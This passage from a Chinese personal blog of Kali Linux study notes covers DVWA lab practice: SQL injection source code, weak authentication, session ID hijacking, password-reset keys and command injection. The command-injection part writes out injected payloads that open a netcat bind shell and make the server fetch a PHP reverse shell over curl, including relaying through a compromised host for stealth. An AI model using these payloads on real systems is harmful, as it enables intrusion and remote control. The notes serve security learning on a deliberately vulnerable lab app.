class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Dvwa的SQL Injection Source（High）<ul>
<li>stripslashes（去除”&quot;）</li>
<li>mysql_real_escape_string</li>
<li>▲ is_numric（判断是否为数字）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" itemprop="url">Kali Linux笔记(四十五)：手动漏洞挖掘--身份认证、SessionID、密码找回、命令执行</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
                2020-01-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  933 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-手动漏洞挖掘–身份认证"><a href="#1-手动漏洞挖掘–身份认证" class="headerlink" title="1. 手动漏洞挖掘–身份认证"></a>1. 手动漏洞挖掘–身份认证</h4><ul>
<li>常用弱口令/基于字典的密码爆破</li>
<li>锁定账号（密码锁定机制，尝试密码次数过多）</li>
<li>信息收集<ul>
<li>手机号（大部分手机号/邮箱号）</li>
<li>页面返回errorcode（界面不显示errorcode）</li>
<li>密码错误提示信息（猜测四位手机号，185xxxx4465）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐密码错误提示信息
1.登录失败（安全性较高）
2.用户名不存在
3.密码错误</code></pre></blockquote>
<ul>
<li>密码嗅探</li>
</ul>
<h4 id="2-手动漏洞挖掘–会话sessionID"><a href="#2-手动漏洞挖掘–会话sessionID" class="headerlink" title="2. 手动漏洞挖掘–会话sessionID"></a>2. 手动漏洞挖掘–会话sessionID</h4><ul>
<li>XSS/Cookie importer</li>
<li>SessionID in URL（SessionID可以存在机器本地，也可存放在内存）</li>
<li>嗅探</li>
<li>SessionID长期不变/永久不变</li>
</ul>
<blockquote>
<pre><code>▲ SessionID注入浏览器：
1.获取其他机子的SessionID
2.通过Cookie Manager过滤，编辑SessionID
3.1.登出进行测试，后退是否能返回（SessionID可能不是活动状态，但可能永久不变）
3.2.关闭浏览器，重新访问，替换SessionID，可能可以进行访问，SessionID固定不变</code></pre></blockquote>
<ul>
<li>SessionID生成算法<ul>
<li>Sequencer</li>
<li>私有算法</li>
<li>预判下一次登陆时生成的SessionID（可能根据时间进行哈希计算作为SessionID）</li>
<li>登出后返回测试</li>
</ul>
</li>
</ul>
<h4 id="3-手动漏洞挖掘–密码找回"><a href="#3-手动漏洞挖掘–密码找回" class="headerlink" title="3. 手动漏洞挖掘–密码找回"></a>3. 手动漏洞挖掘–密码找回</h4><ul>
<li><a href="https://www.example.com/reset?email=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514" target="_blank" rel="noopener">https://www.example.com/reset?email=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514</a></li>
</ul>
<blockquote>
<pre><code>密码找回步骤：
1.界面点击忘记密码按钮
2.根据提示输入原密码邮箱等信息，点击发送邮件按钮
3.服务器发送邮件到客户端邮箱
4.打开邮件，邮件里面的链接可以进行密码重设（key值）
▲ 链接的key值字符串，可能为邮箱账号进行md5运算(128位)或是sha-1(160位)或是sha-2(256位)</code></pre></blockquote>
<h4 id="4-手动漏洞挖掘–命令执行"><a href="#4-手动漏洞挖掘–命令执行" class="headerlink" title="4. 手动漏洞挖掘–命令执行"></a>4. 手动漏洞挖掘–命令执行</h4><ul>
<li>漏洞挖掘原则<ul>
<li>所有变量（攻击注入手段）</li>
<li>所有头（Cookie中的变量）</li>
<li>逐个变量删除（Cookie还是body中的字段让服务器进行判断）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>DVWA命令执行漏洞/exec:header和body进行删除，需要对一些符号进行URL encode</code></pre></blockquote>
<ul>
<li>漏洞的本质<ul>
<li>数据与指令的混淆</li>
<li>对用户输入信息过滤不严判断失误，误将指令当数据</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐low：DVWA命令执行漏洞/exec
1.如果是操作系统命令操作，而不是Web Application进行操作，可以进行命令行尝试
2.查看Command Execution Source，发现没有对&apos;&amp;&amp;&apos;和&apos;;&apos;进行过滤
⭐medium：DVWA命令执行漏洞/exec
1.查看Command Execution Source，发现没有对&apos;&amp;&amp;&apos;和&apos;;&apos;进行过滤
2.操作系统shell命令的熟悉程度，没有对&apos;&amp;&apos;和&apos;|&apos;进行过滤
⭐high：DVWA命令执行漏洞/exec
1.查看Command Execution Source，发现过滤很严格，先对字符串进行处理ip地址，然后对输入的内容进行&apos;.&apos;分割的成4段，然后再判断这4段是不是都是数字，如果是，则进行运行命令</code></pre></blockquote>
<ul>
<li>命令执行<ul>
<li>应用程序开发者直接调用操作系统功能</li>
<li>; &amp;&amp; | || &amp;</li>
<li>查看源代码，过滤用户输入</li>
<li>;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe</li>
</ul>
</li>
<li>;curl <a href="http://1.1.1.1/php-revers-shell.php" target="_blank" rel="noopener">http://1.1.1.1/php-revers-shell.php</a></li>
</ul>
<blockquote>
<pre><code>⭐curl下载执行php，反弹shell
Kali
1.cp /usr/share/webshells/php/php-reverse-shell.php /var/www/htmp/1.php
2.启动apache2，services apache2 start
3.编辑php-revers-shell.php的反弹IP地址 → Kali地址
DVWA：
1.;curl http://Kali IP地址/1.php
▲ 结果返回的是Kali的shell，因为1.php在Kali上，所以只能返回Kali本机的shel

⭐curl应用（控制肉鸡隐蔽性）
1.三台机器，一台Kali，开启1234端口；一台服务器DVWA；一台肉鸡，有反弹shell的php
2.kali发送;curl命令给DVWA，DVWA进行curl
3.肉鸡上的反弹php返回一个shell给kali</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/5/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">93</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:643008933@qq.com" target="_blank" title="QQ邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>QQ邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">93.3k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
